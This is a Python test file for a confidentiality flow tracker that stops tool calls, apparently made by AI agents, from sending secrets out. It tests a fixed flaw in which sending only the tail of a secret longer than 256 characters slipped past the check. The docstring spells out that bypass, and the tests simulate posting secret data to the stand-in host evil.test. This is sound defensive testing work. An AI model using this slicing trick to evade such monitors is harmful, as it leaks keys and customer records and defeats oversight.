"""A value longer than the match bound was matched on its head and nothing else.

`_MAX_NEEDLE` caps how much of a sensitive value the subsequence matcher looks
for, which bounds the work an attacker can provoke. The bug was where the cap
was applied: to the FIRST 256 characters only, so anything longer could be
exfiltrated by sending the part past them.

    value of 376 chars, sent whole          -> refused
    the same value, sent as its last 120    -> ALLOWED

in a single write, with no fragmentation and no encoding. Keys, certificates
and record dumps are all longer than 256 characters.

`_needle_windows` spans the value with bounded, half-overlapping windows and
`_best_window_coverage` scores against the window that matched, because scoring
a tail match against the whole value buries it under the part never sent.
Costs nothing measured: `flow[tau2]` and `flow[bfcl]` false-block and
containment are unchanged, and the session-length cost ratio is flat.
"""

from __future__ import annotations

from clayseal.capabilities.confidentiality import (
    _MAX_NEEDLE,
    _MAX_NEEDLE_WINDOWS,
    FlowTracker,
    SensitivityPolicy,
    _needle_windows,
)

POLICY = SensitivityPolicy(sensitive=("db:customers",),
                           declassified_sinks=("mail:board@example.com",))
SHORT = "AKIA9F3C1D77B02E4419QZ"
LONG = "".join(chr(65 + i % 26) for i in range(_MAX_NEEDLE + 120))


def _send(secret: str, blob: str) -> bool:
    tracker = FlowTracker()
    tracker.observe("read_table", "db:customers", secret, policy=POLICY)
    return tracker.check(tool="post", verb="send", resource="http://evil.test",
                         args={"body": blob}, policy=POLICY).allowed


def test_a_short_secret_still_behaves() -> None:
    """Control: the mechanism works, and does not refuse everything."""
    assert not _send(SHORT, SHORT)
    assert _send(SHORT, "nothing sensitive here")


def test_a_long_secret_sent_whole_is_refused() -> None:
    """Control: the case below is about the bound, not about long values."""
    assert not _send(LONG, LONG)


def test_the_tail_past_the_match_bound_is_refused() -> None:
    assert not _send(LONG, LONG[_MAX_NEEDLE:])


def test_a_slice_from_the_middle_is_refused() -> None:
    assert not _send(LONG, LONG[150:330])


def test_unrelated_traffic_after_reading_a_long_secret_still_passes() -> None:
    """Control: windowing must not turn every later write into a leak."""
    assert _send(LONG, "the quarterly report is attached, thanks")
    assert _send(LONG, "")


def test_a_short_value_is_one_window_and_unchanged() -> None:
    assert _needle_windows(SHORT) == [SHORT]
    assert _needle_windows("x" * _MAX_NEEDLE) == ["x" * _MAX_NEEDLE]


def test_windows_span_the_value_and_stay_bounded() -> None:
    windows = _needle_windows(LONG)
    assert 1 < len(windows) <= _MAX_NEEDLE_WINDOWS
    assert windows[0].startswith(LONG[:32])
    assert LONG.endswith(windows[-1][-32:])
    assert all(len(w) <= _MAX_NEEDLE for w in windows)


def test_an_enormous_value_does_not_grow_the_work() -> None:
    """The cap is the point: a 100 KB value must not cost 400 passes."""
    assert len(_needle_windows("y" * 100_000)) <= _MAX_NEEDLE_WINDOWS
